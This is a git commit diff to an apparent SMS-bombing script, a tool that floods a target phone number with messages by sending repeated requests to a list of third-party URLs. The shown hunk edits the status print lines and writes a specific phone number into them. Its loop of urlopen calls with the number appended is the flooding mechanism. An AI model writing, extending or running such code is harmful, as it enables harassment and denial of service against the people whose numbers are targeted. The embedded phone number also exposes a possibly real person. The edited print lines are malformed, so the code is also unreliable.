3d151ec4d510dcca081c6f890aa7fe83f85e1d99
braxtoncarpcarp-coder <braxtoncarpcarp@gmail.com>
2026-04-02 19:11:09 -0400

    Update SMS_bomber_version2.py

--- SMS_bomber_version2.py
+++ SMS_bomber_version2.py
@@ -43,8 +43,8 @@ def send(num, counter, slep):
     for y in range(int(counter)):
         for x in url1:
             banner()
-            print("Target Number          : ", +1 9108592384)
-            print("Number of Message Sent : ", y+1)
+            print("Target Number          :+1 9108592384 ", num)
+            print("Number of Message Sent : 1 ", y+1)
             result_url=str(x)+num
             resp1=Request(result_url)
             urlopen(resp1)
